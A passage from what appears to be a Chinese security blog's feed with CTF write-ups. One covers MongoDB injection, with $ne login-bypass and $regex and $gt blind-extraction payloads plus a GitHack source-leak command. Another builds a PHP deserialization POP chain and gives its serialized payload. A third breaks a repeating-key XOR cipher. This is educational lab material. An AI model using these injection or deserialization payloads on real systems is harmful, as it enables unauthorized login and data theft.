    <content type="html"><![CDATA[<h2 id="mongodb注入"><a href="#mongodb注入" class="headerlink" title="mongodb注入"></a>mongodb注入</h2><p>cybircsctf的一道nopesql，开始没想到是mongodb注入，某天惊奇地发现题目还没关，复现一下，学习一下mongodb注入</p><a id="more"></a><h3 id="mongodb"><a href="#mongodb" class="headerlink" title="mongodb"></a>mongodb</h3><p>参考链接：<a href="http://www.vuln.cn/6354" target="_blank" rel="noopener">http://www.vuln.cn/6354</a><br>1.用mongo类中相应的方法执行增查减改，传递进入的参数是一个数组：</p><pre><code>&lt;?php$mongo = new mongoclient();$db = $mongo-&gt;myinfo; //选择数据库$coll = $db-&gt;test; //选择集合$coll-&gt;save();    //增$coll-&gt;find();    //查$coll-&gt;remove();    //减$coll-&gt;update();    //改</code></pre><p>2.用execute方法执行字符串 传递进入的参数是query的值：</p><pre><code>#!php&lt;?php$mongo = new mongoclient();$db = $mongo-&gt;myinfo; //选择数据库$query = &quot;db.table.save({&apos;newsid&apos;:1})&quot;;    //增$query = &quot;db.table.find({&apos;newsid&apos;:1})&quot;;    //查$query = &quot;db.table.remove({&apos;newsid&apos;:1})&quot;;    //减$query = &quot;db.table.update({&apos;newsid&apos;:1},{&apos;newsid&apos;,2})&quot;;    改$result = $db-&gt;execute($query);</code></pre><h3 id="shell和php"><a href="#shell和php" class="headerlink" title="shell和php"></a>shell和php</h3><pre><code>php语句    $db-&gt;find([&quot;num&quot;=&gt;[&apos;$gt&apos;=&gt;2],&quot;name&quot;=&gt;&quot;test_3&quot;])shell语句    b.tr1ple.find({&apos;num&apos;:{&quot;$gt&quot;:2},&apos;name&apos;:&apos;test_3&apos;})相当于sql语句    select * from tr1ple where num&gt;2 and name=&quot;test_3&quot;</code></pre><h3 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h3><p>mongodb条件操作符</p><table><thead><tr><th style="text-align:center">操作符</th><th style="text-align:center">对应</th></tr></thead><tbody><tr><td style="text-align:center">$lt</td><td style="text-align:center">&lt;</td></tr><tr><td style="text-align:center">$lte</td><td style="text-align:center">&lt;=</td></tr><tr><td style="text-align:center">$ne</td><td style="text-align:center">!=</td></tr><tr><td style="text-align:center">$gt</td><td style="text-align:center">&gt;</td></tr><tr><td style="text-align:center">$gte</td><td style="text-align:center">&gt;=</td></tr></tbody></table><h4 id="数组注入"><a href="#数组注入" class="headerlink" title="数组注入"></a>数组注入</h4><pre><code>#!php&lt;?php$mongo = new mongoclient();$db = $mongo-&gt;myinfo; //选择数据库$coll = $db-&gt;test; //选择集合$username = $_GET[&apos;username&apos;];$password = $_GET[&apos;password&apos;];$data = array(        &apos;username&apos;=&gt;$username,        &apos;password&apos;=&gt;$password        );$data = $coll-&gt;find($data);$count = $data-&gt;count();if ($count&gt;0) {    foreach ($data as $user) {        echo &apos;username:&apos;.$user[&apos;username&apos;].&quot;&lt;/br&gt;&quot;;        echo &apos;password:&apos;.$user[&apos;password&apos;].&quot;&lt;/br&gt;&quot;;    }}else{    echo &apos;未找到&apos;;}?&gt;</code></pre><p>此时我们传递参数</p><pre><code>?username=test&amp;password=test</code></pre><p>相当于执行了查询语句</p><pre><code>db-&gt;test-&gt;find({username:’test’,password:’test’});</code></pre><p>并且输出查询的内容<br>而我们要注入的语句是</p><pre><code>?username[$ne]=test&amp;password[$ne]=test</code></pre><p>相当于执行了</p><pre><code>db.test.find({username:{‘$ne’:’test’},password:{‘$ne’:’test’}});  </code></pre><p>相当于对username!=test，password!=test的查询<br>此处是字符的比较，比较的是字符的ascii值</p><p>对应sql语句：</p><pre><code>select * from test where username!=’test’ and password!=’test’;</code></pre><p>返回所有username!=test，password!=test的结果  </p><p>如果读取后并没有回显，我们可以采取$regex操作符来一位一位获取数据。</p><pre><code>传递参数为 username[$regex]=^a对应的操作为db.test.find({username:{‘$regex’:’^a’},password:{‘$regex’:’^a’}})</code></pre><p>从第一位开始，^a,^a1,^a13 ……</p><h4 id="拼接字符串时的注入"><a href="#拼接字符串时的注入" class="headerlink" title="拼接字符串时的注入"></a>拼接字符串时的注入</h4><pre><code>#!php&lt;?php$username = $_GET[&apos;username&apos;];$password = $_GET[&apos;password&apos;];$query = &quot;var data = db.test.findOne({username:&apos;$username&apos;,password:&apos;$password&apos;});return data;&quot;;//$query = &quot;return db.test.findOne();&quot;;//echo $query;$mongo = new mongoclient();$db = $mongo-&gt;myinfo;$data = $db-&gt;execute($query);if ($data[&apos;ok&apos;] == 1) {    if ($data[&apos;retval&apos;]!=NULL) {        echo &apos;username:&apos;.$data[&apos;retval&apos;][&apos;username&apos;].&quot;&lt;/br&gt;&quot;;        echo &apos;password:&apos;.$data[&apos;retval&apos;][&apos;password&apos;].&quot;&lt;/br&gt;&quot;;    }else{        echo &apos;未找到&apos;;    }}else{    echo $data[&apos;errmsg&apos;];}?&gt;</code></pre><p>和sql中堆叠注入有点像，将前面正常的语句闭合，加,后面的构造的语句依旧可以执行</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>git源码泄露，大佬wp中学到的姿势，虽然它404了，但是我们可以看到.git后面加了/，虚假的404，可以用githack得到源码。<br><img src="/2019/08/13/mongodb注入/1.png" alt=" "></p><pre><code>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。工作原理解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )去.git/objects/ 文件夹下下载对应的文件zlib解压文件，按原始的目录结构写入源代码</code></pre><p>命令：</p><pre><code>python git.py http://173.199.118.226/.git/</code></pre><p>得到index.php源码：</p><h4 id="登陆部分"><a href="#登陆部分" class="headerlink" title="登陆部分"></a>登陆部分</h4><pre><code>&lt;?phprequire_once __DIR__ . &quot;/vendor/autoload.php&quot;;function auth($username, $password) {    $collection = (new MongoDB\Client(&apos;mongodb://localhost:27017/&apos;))-&gt;test-&gt;users;    $raw_query = &apos;{&quot;username&quot;: &quot;&apos;.$username.&apos;&quot;, &quot;password&quot;: &quot;&apos;.$password.&apos;&quot;}&apos;;    $document = $collection-&gt;findOne(json_decode($raw_query));    if (isset($document) &amp;&amp; isset($document-&gt;password)) {        return true;    }    return false;}$user = false;if (isset($_COOKIE[&apos;username&apos;]) &amp;&amp; isset($_COOKIE[&apos;password&apos;])) {    $user = auth($_COOKIE[&apos;username&apos;], $_COOKIE[&apos;password&apos;]);}if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) {    $user = auth($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]);    if ($user) {        setcookie(&apos;username&apos;, $_POST[&apos;username&apos;]);        setcookie(&apos;password&apos;, $_POST[&apos;password&apos;]);    }}?&gt;</code></pre><p>我们观察到$raw_query处可以进行字符串的拼接： </p><pre><code>构造username:admin password=&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;a&quot;},&quot;username&quot;:&quot;admin或者password=&quot;,&quot;password&quot;:{&quot;$gt&quot;:&quot;a&quot;},&quot;username&quot;:&quot;admin</code></pre><p>将前面语句闭合，并构造了新的查询，用户名为admin，password不为a，就可以返回true从而进行登陆</p><h4 id="查询部分"><a href="#查询部分" class="headerlink" title="查询部分"></a>查询部分</h4><pre><code>&lt;?php if ($user == true): ?&gt;    Welcome!    &lt;div&gt;        Group most common news by        &lt;a href=&quot;?filter=$category&quot;&gt;category&lt;/a&gt; |         &lt;a href=&quot;?filter=$public&quot;&gt;publicity&lt;/a&gt;&lt;br&gt;    &lt;/div&gt;    &lt;?php        $filter = $_GET[&apos;filter&apos;];        $collection = (new MongoDB\Client(&apos;mongodb://localhost:27017/&apos;))-&gt;test-&gt;news;        $pipeline = [            [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]],            [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]],            [&apos;$limit&apos; =&gt; 5],        ];        $filters = [            [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]]        ];        $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));    ?&gt;    &lt;?php if (isset($filter)): ?&gt;        &lt;?php            foreach ($cursor as $category) {                    printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&apos;_id&apos;], $category[&apos;count&apos;]);            }        ?&gt;    &lt;?php endif; ?&gt;&lt;?php else: ?&gt;    &lt;?php if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])): ?&gt;        Invalid username or password    &lt;?php endif; ?&gt;    &lt;form action=&apos;/&apos; method=&quot;POST&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;        &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;        &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;    &lt;h2&gt;News&lt;/h2&gt;    &lt;?php        $collection = (new MongoDB\Client(&apos;mongodb://localhost:27017/&apos;))-&gt;test-&gt;news;        $cursor = $collection-&gt;find([&apos;public&apos; =&gt; 1]);        foreach ($cursor as $news) {            printf(&quot;%s&lt;br&gt;&quot;, $news[&apos;title&apos;]);        }    ?&gt;&lt;?php endif; ?&gt;</code></pre><p>MongoDB中聚合(aggregate)主要用于处理数据(诸如统计平均值,求和等)，并返回计算后的数据结果,有点类似sql语句中的count(*)。MongoDB的管道将MongoDB文档在一个管道处理完毕后将结果传递给下一个管道处理。管道操作是可以重复的，以下是几个管道相关操作中的表达式：<br>  $project:修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档，可以把它当作指定域，因为默认find()函数将范围集合中所有的域的数据(可以把它当作SQL里面的字段来理解)。<br>  $limit:用来限制MongoDB聚合管道返回的文档数。<br>  $group:将集合中的文档分组，可用于统计结果。<br>  $sort:将输入文档排序后输出。(使用1和-1来指定排序的方式,其中1为升序排列,而-1是用于降序排列)  </p><p>首先我们来理解一下<br>1</p><pre><code>$pipeline = [            [&apos;$group&apos; =&gt; [&apos;_id&apos; =&gt; &apos;$category&apos;, &apos;count&apos; =&gt; [&apos;$sum&apos; =&gt; 1]]],            [&apos;$sort&apos; =&gt; [&apos;count&apos; =&gt; -1]],//降序输出            [&apos;$limit&apos; =&gt; 5],//限制返回文档数为5        ];&apos;_id&apos; =&gt; &apos;$category&apos;前面的情况出现一次，$sum值+1(如果是=&gt;2的话+2)，并赋值给count{ $group: { _id：&quot;$分组字段名&quot;, 显示字段名: { 聚集函数: &quot;$字段名&quot;}，[显示字段名2: { 聚集函数: &quot;$字段名&quot;}, ...] } }</code></pre><p>2</p><pre><code>$filters = [            [&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; $filter]]        ];对category进行了重命名</code></pre><p>3 </p><pre><code>$cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));array_merge() 函数把一个或多个数组合并为一个数组。</code></pre><p>4</p><pre><code>foreach ($cursor as $category) {                    printf(&quot;%s has %d news&lt;br&gt;&quot;, $category[&apos;_id&apos;], $category[&apos;count&apos;]);}将cursor中所有组遍历赋值给category，打印其中_id和count</code></pre><p>我们传递filter参数，并把其值作为分组字段，返回各分组信息，当filter=$category ,我们可以看到他输出的结果是</p><pre><code>Welcome! Group most common news by category | publicitypolitics has 9 newsflags has 9 newsfinance has 5 newscomedy has 5 news</code></pre><p>测试发现category还可以是$_id，$text，$title，但是limit的限制没法打印text中的flag</p><h4 id="数组盲注"><a href="#数组盲注" class="headerlink" title="数组盲注"></a>数组盲注</h4><p>需要传递两个参数，而且前后$内容要一致</p><pre><code>?filter[$gt][0]=$text&amp;filter[$gt][1]=c</code></pre><p>相当于</p><pre><code>[&apos;$project&apos; =&gt; [&apos;category&apos; =&gt; [$gt =&gt; [&quot;text&quot;, &quot;c&quot;]]]]后面的c为text分组内的内容，所以前后参数都要为$gt</code></pre><p>payload是</p><pre><code>?filter[$gt][0]=$text&amp;filter[$gt][1]=cy</code></pre><p>显示<br><img src="/2019/08/13/mongodb注入/2.png" alt=" "></p><pre><code>?filter[$gt][0]=$text&amp;filter[$gt][1]=cz</code></pre><p>则显示<br><img src="/2019/08/13/mongodb注入/3.png" alt=" "></p><p>就可以写脚本得到flag</p><p>得到flag后也可以对此进行验证<br>    ?filter[$ne][0]=$text&amp;filter[$ne][1]=cybrics{7|-|15 15 4 7E&gt;&lt;7 |=|_49}</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;mongodb注入&quot;&gt;&lt;a href=&quot;#mongodb注入&quot; class=&quot;headerlink&quot; title=&quot;mongodb注入&quot;&gt;&lt;/a&gt;mongodb注入&lt;/h2&gt;&lt;p&gt;cybircsctf的一道nopesql，开始没想到是mongodb注入，某天惊奇地发现题目还没关，复现一下，学习一下mongodb注入&lt;/p&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化</title>
    <link href="http://yoursite.com/2019/08/13/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://yoursite.com/2019/08/13/php反序列化/</id>
    <published>2019-08-13T08:05:13.000Z</published>
    <updated>2019-08-14T05:37:05.679Z</updated>
    
    <content type="html"><![CDATA[<h2 id="php反序列化漏洞的整理"><a href="#php反序列化漏洞的整理" class="headerlink" title="php反序列化漏洞的整理"></a>php反序列化漏洞的整理</h2><p>PHP序列化：php为了方便进行数据的传输，允许把复杂的数据对象，压缩到一个字符串中，使用serialize()函数。</p><p>PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。</p><a id="more"></a><h3 id="序列化格式解释"><a href="#序列化格式解释" class="headerlink" title="序列化格式解释"></a>序列化格式解释</h3><p>a - array  数组<br>b - boolean  布尔值<br>d - double  double类型<br>i - integer  整数<br>o - common object 公共对象<br>r - reference  引用<br>s - string  字符串<br>C - custom object  自定义对象<br>O - class   类<br>N - null  空<br>R - pointer reference  指针<br>U - unicode string  Unicode字符串  </p><p>举例介绍：</p><p>O:3:“foo”:2:{s:4:”file”;s:9:”shell.php”;s:4:”data”;s:5:”aaaaa”;}</p><p>O:3: 参数类型为对象</p><p>“foo”:2: 参数名为foo，有两个值</p><p>S:4:”file”;s:9:”shell.php”; s:参数类型为字符串(数字为i)，长度为4，值为file。长度为9的字符串shell.php</p><p>s:4:”data”;s:5:”aaaaa”;} 长度为4的字符串data，长度为5的字符串aaaaa</p><h3 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h3><pre><code>&lt;?php$data=[&apos;PHP&apos;,&apos;HTML&apos;,&apos;Java&apos;,&apos;Python&apos;];echo serialize($data);</code></pre><p>结果：</p><pre><code>a:4:{i:0;s:3:&quot;PHP&quot;;i:1;s:4:&quot;HTML&quot;;i:2;s:4:&quot;Java&quot;;i:3;s:6:&quot;Python&quot;;}</code></pre><h3 id="指针序列化"><a href="#指针序列化" class="headerlink" title="指针序列化"></a>指针序列化</h3><p>之前国赛just soso中有一步绕过就利用了指针序列化  </p><pre><code>if($this-&gt;token === $this-&gt;token_flag)  </code></pre><p>本来以为是伪随机数种子，后来发现只需在序列化中让$F-&gt;token=&amp;$F-&gt;token_flag;  </p><p>&amp;表示取变量值，将两个变量的值在序列化反序列化过程中关联起来，就可以相等</p><h3 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h3><p>php之所以会存在反序列化的漏洞原因是一些魔法函数</p><pre><code>__construct():当一个类被创建时自动调用  __destruct():当一个类被销毁时自动调用  __invoke():当把一个类当作函数使用时自动调用  __tostring():当把一个类当作字符串使用时自动调用  __wakeup():当调用unserialize()函数时自动调用  __sleep():当调用serialize()函数时自动调用  __call():当要调用的方法不存在或权限不足时自动调用 </code></pre><p>如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了<br>同样在之前国赛的just soso中有一个<strong>wakeup()的绕过， </strong>wakeup()触发于unserilize()调用之前，但是如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得wakeup函数失效。</p><p>我们可以利用这种自动执行某些函数或方法的特性，执行我们相要的操作。</p><h3 id="夏令营一道题目"><a href="#夏令营一道题目" class="headerlink" title="夏令营一道题目"></a>夏令营一道题目</h3><pre><code> &lt;?phpinclude &apos;flag.php&apos;;class Deep{        public $m1;        public $m2;        public function __destruct(){                $this-&gt;m1-&gt;boy();        }}class Dark{        public $m1;        public $m2;        public function boy(){                $this-&gt;m1-&gt;next_door();        }}class Fantasy{        public $m1;        public $m2;        public function __call($next_door,$arr){                $s = $this-&gt;m1;                $s();        }}class Happy{        public $m1;        public $m2;        public function __invoke(){                $this-&gt;m2=&quot;cnss&quot;.$this-&gt;m1;        }}class New_year{        public $s1;        public $s2;        public function __toString(){                $this-&gt;s1-&gt;get_flag();                return &quot;1&quot;;        }}class GetFlag{    public function get_flag(){        global $flag;        echo $flag;        }}$a = $_GET[&apos;payload&apos;];unserialize($a);show_source(__FILE__);?&gt;</code></pre><p>反序列化脚本：  </p><pre><code>&lt;?phpclass Deep{        public $m1;        public $m2;        public function __construct(){                $this-&gt;m1= new Dark();#可以直接赋值位Fantasy()        }        public function __destruct(){                $this-&gt;m1-&gt;boy();        }}class Dark{        public $m1;        public $m2;        public function __construct(){                $this-&gt;m1= new Fantasy();        }        public function boy(){                $this-&gt;m1-&gt;next_door();        }}class Fantasy{        public $m1;        public $m2;        public function __construct(){#无法调用next_door方法时，就调用__call方法， $this-&gt;m1-&gt;next_door();所以此处将m1赋值为Happy()类，无法调用next_door，自动调用call方法                $this-&gt;m1= new Happy();        }        public function __call($next_door,$arr){                $s = $this-&gt;m1;                $s();        }}class Happy{        public $m1;        public $m2;        public function __construct(){                $this-&gt;m1= new New_year();//由于__toString()方法，所以要将New_year作为字符串来使用        }        public function __invoke(){                $this-&gt;m2=&quot;cnss&quot;.$this-&gt;m1;//字符串拼接来使用__toString()中的get_flag()        }}class New_year{        public $s1;        public $s2;         public function __construct(){                $this-&gt;s1= new GetFlag();//get_flag()在GetFlag类中，所以要先将s1赋值为GetFlag()才能使用get_flag()        }        public function __toString(){                $this-&gt;s1-&gt;get_flag();                return &quot;1&quot;;        }}class GetFlag{    public function get_flag(){        global $flag;        echo $flag;        }}$a = new Deep;echo urlencode(serialize($a));</code></pre><p>payload：</p><pre><code>O%3A4%3A%22Deep%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22Dark%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A7%3A%22Fantasy%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A2%3A%22m1%22%3BO%3A8%3A%22New_year%22%3A2%3A%7Bs%3A2%3A%22s1%22%3BO%3A7%3A%22GetFlag%22%3A0%3A%7B%7Ds%3A2%3A%22s2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7Ds%3A2%3A%22m2%22%3BN%3B%7D</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;php反序列化漏洞的整理&quot;&gt;&lt;a href=&quot;#php反序列化漏洞的整理&quot; class=&quot;headerlink&quot; title=&quot;php反序列化漏洞的整理&quot;&gt;&lt;/a&gt;php反序列化漏洞的整理&lt;/h2&gt;&lt;p&gt;PHP序列化：php为了方便进行数据的传输，允许把复杂的数据对象，压缩到一个字符串中，使用serialize()函数。&lt;/p&gt;
&lt;p&gt;PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。&lt;/p&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Xor异或解密</title>
    <link href="http://yoursite.com/2019/08/05/Xor%E5%BC%82%E6%88%96%E8%A7%A3%E5%AF%86/"/>
    <id>http://yoursite.com/2019/08/05/Xor异或解密/</id>
    <published>2019-08-05T09:50:06.000Z</published>
    <updated>2019-08-12T03:56:30.011Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Xorzz"><a href="#Xorzz" class="headerlink" title="Xorzz"></a>Xorzz</h2><p>De1ctf密码学一道题，当时不会做，orz….,题目</p><pre><code>from itertools import *from data import flag,plainkey=flag.strip(&quot;de1ctf{&quot;).strip(&quot;}&quot;)assert(len(key)&lt;38)salt=&quot;WeAreDe1taTeam&quot;ki=cycle(key)si=cycle(salt)cipher = &apos;&apos;.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[2:].zfill(2) for p in plain])print cipheroutput:</code></pre><a id="more"></a><pre><code>49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</code></pre><p>题目中</p><pre><code>ord(p) ^ ord(next(ki)) ^ ord(next(si))</code></pre><p>三个异或之后再转换为16进制，[2:].zfill(2)去掉了头两位0x，并在少于两位时左补0，输出有1200位，也就是一次异或得到两位数字<br>由此可以得出ord(p) ^ ord(next(ki))的一串值，然后plain是个600位的字符串，key循环和plain中的每一位字符异或，然后就不会了orz….</p><p>先是python2按位异或，python中字符串*一个数字n相当于将字符串重复了n遍，(密文的长度/salt长度)+1是salt字符串重复的次数，再 [:len(h)]取与密文相同的位数，然后strxor按位异或，结果base64加密后输出</p><pre><code># coding=&lt;encoding name&gt;# vim: set fileencoding=utf-8 :import itertoolsimport base64from Crypto.Util.strxor import strxora=&apos;WeAreDe1taTeam&apos;h=&apos;49380d773440222d1b421b3060.....&apos;h=h.decode(&apos;hex&apos;)m=(a*(len(h)/len(a)+1))[:len(h)]o=strxor(h,m).encode(&apos;base64&apos;)print(o)</code></pre><p>一次流密码的解密</p><h3 id="汉明距离猜解密钥长度"><a href="#汉明距离猜解密钥长度" class="headerlink" title="汉明距离猜解密钥长度"></a>汉明距离猜解密钥长度</h3><p>汉明距离其实是在二进制层面观测两个等长字符串的比特位差异，也就是1111和1000的汉名距离为3，两个二进制字符串按位异或有多少个1，汉明距离就为多少</p><p>那么汉明距离和密文长度又有什么关系呢？<br>两个以ascii编码的英文字符的汉明距离是2-3之间，也就是说正常英文字母的平均汉明距离为2-3（每比特），任意字符（非纯字母）的两两汉明距离平均为4。当我们使用了正确的密钥长度后，对密文中两两字母进行计算汉明距离，汉明距离的值应该是趋于最小</p><h3 id="根据猜解的密钥长度解得密钥"><a href="#根据猜解的密钥长度解得密钥" class="headerlink" title="根据猜解的密钥长度解得密钥"></a>根据猜解的密钥长度解得密钥</h3><h4 id="利用明文中空格"><a href="#利用明文中空格" class="headerlink" title="利用明文中空格"></a>利用明文中空格</h4><p>在使用异或加密的形式下，使用相同密钥加密的明文和密文间存在这两个规律：<br>1.密文和密文异或等于明文和明文异或。 也就是说将明文和密文按照密钥长度分组后，相对应得两个密文字符和两个明文字符异或是相等的<br>2.空格和所有小写字母异或结果是相应的大写字母，空格和所有大写字母异或是相应的小写字母。</p><p>这样当两个密文按照字节异或后的结果处于字母表的ascii值之间，我们就可以有很大的概率认为异或的明文字符之一是空格</p><pre><code>也就是 密文第一位^密文第31位=字母表ascii=明文第1(31)位^空格</code></pre><p>按密钥长度将密文进行分组，取其中一个分组，将里面的字符两两异或，如果某一密文字符和其他密文字符异或的结果都处于字母表区间，那么我们将推断其对应位置的明文为空格，密文字节与空格异或就得到了对应位置的密钥密钥</p><h4 id="字频攻击"><a href="#字频攻击" class="headerlink" title="字频攻击"></a>字频攻击</h4><p>最后附上脚本，造轮子是不可能自己会造的(枯了<br>本文非原创，原文参考链接：<a href="https://www.anquanke.com/post/id/161171" target="_blank" rel="noopener">https://www.anquanke.com/post/id/161171</a></p><p>没想明白为什么^无法进行str^str的异或，但是在脚本中就可以qaq</p><pre><code>import base64import stringdef bxor(a, b):     # 计算汉明距离，两个二进制字符串按位异或有多少个1就有多少个不同的字符    if len(a) &gt; len(b):        return bytes([x ^ y for x, y in zip(a[:len(b)], b)])    else:        return bytes([x ^ y for x, y in zip(a, b[:len(a)])])def hamming_distance(b1, b2):#计算二进制字符按位异或后1的个数    differing_bits = 0    for byte in bxor(b1, b2):        differing_bits += bin(byte).count(&quot;1&quot;)    return differing_bitsdef score(s):    freq = {}    freq[&apos; &apos;] = 700000000    freq[&apos;e&apos;] = 390395169    freq[&apos;t&apos;] = 282039486    freq[&apos;a&apos;] = 248362256    freq[&apos;o&apos;] = 235661502    freq[&apos;i&apos;] = 214822972    freq[&apos;n&apos;] = 214319386    freq[&apos;s&apos;] = 196844692    freq[&apos;h&apos;] = 193607737    freq[&apos;r&apos;] = 184990759    freq[&apos;d&apos;] = 134044565    freq[&apos;l&apos;] = 125951672    freq[&apos;u&apos;] = 88219598    freq[&apos;c&apos;] = 79962026    freq[&apos;m&apos;] = 79502870    freq[&apos;f&apos;] = 72967175    freq[&apos;w&apos;] = 69069021    freq[&apos;g&apos;] = 61549736    freq[&apos;y&apos;] = 59010696    freq[&apos;p&apos;] = 55746578    freq[&apos;b&apos;] = 47673928    freq[&apos;v&apos;] = 30476191    freq[&apos;k&apos;] = 22969448    freq[&apos;x&apos;] = 5574077    freq[&apos;j&apos;] = 4507165    freq[&apos;q&apos;] = 3649838    freq[&apos;z&apos;] = 2456495    score = 0    string=bytes.decode(s)    for c in string.lower():        if c in freq:            score += freq[c]    return scoredef break_single_key_xor(b1):    max_score = 0    english_plaintext = 0    key = 0    for i in range(0,256):        b2 = [i] * len(b1)        try:            plaintext = bxor(b1, b2)            pscore = score(plaintext)        except Exception:            continue        if pscore &gt; max_score or not max_score:            max_score = pscore            english_plaintext = plaintext            key = chr(i)    return keytext = &apos;上面脚本中输出的结果&apos;with open(r&quot;c:/Users/lyy18291855970/Desktop/密码学/密码题/the cryptopals crypto challenges/6.txt&quot;, &quot;r&quot;) as f:    for line in f:        text += lineb = base64.b64decode(text)normalized_distances = []for KEYSIZE in range(2, 40):    #我们取其中前6段计算平局汉明距离    b1 = b[: KEYSIZE]    b2 = b[KEYSIZE: KEYSIZE * 2]    b3 = b[KEYSIZE * 2: KEYSIZE * 3]    b4 = b[KEYSIZE * 3: KEYSIZE * 4]    b5 = b[KEYSIZE * 4: KEYSIZE * 5]    b6 = b[KEYSIZE * 5: KEYSIZE * 6]    b7 = b[KEYSIZE * 6: KEYSIZE * 7]    normalized_distance = float(        hamming_distance(b1, b2) +        hamming_distance(b2, b3) +        hamming_distance(b3, b4) +        hamming_distance(b4, b5) +        hamming_distance(b5, b6)     ) / (KEYSIZE * 5)    normalized_distances.append(        (KEYSIZE, normalized_distance)    )normalized_distances = sorted(normalized_distances, key=lambda x: x[1])for KEYSIZE, _ in normalized_distances[:5]:    block_bytes = [[] for _ in range(KEYSIZE)]    for i, byte in enumerate(b):        block_bytes[i % KEYSIZE].append(byte)    keys = &apos;&apos;    for bbytes in block_bytes:        keys += break_single_key_xor(bbytes)    key = bytearray(keys * len(b), &quot;utf-8&quot;)    plaintext = bxor(b, key)    print(&quot;keysize:&quot;, KEYSIZE)    print(&quot;key is:&quot;, keys, &quot;n&quot;)    s = bytes.decode(plaintext)    print(s)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Xorzz&quot;&gt;&lt;a href=&quot;#Xorzz&quot; class=&quot;headerlink&quot; title=&quot;Xorzz&quot;&gt;&lt;/a&gt;Xorzz&lt;/h2&gt;&lt;p&gt;De1ctf密码学一道题，当时不会做，orz….,题目&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from itertools import *
from data import flag,plain

key=flag.strip(&amp;quot;de1ctf{&amp;quot;).strip(&amp;quot;}&amp;quot;)
assert(len(key)&amp;lt;38)
salt=&amp;quot;WeAreDe1taTeam&amp;quot;
ki=cycle(key)
si=cycle(salt)
cipher = &amp;apos;&amp;apos;.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si)))[2:].zfill(2) for p in plain])
print cipher
output:
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SSRF</title>
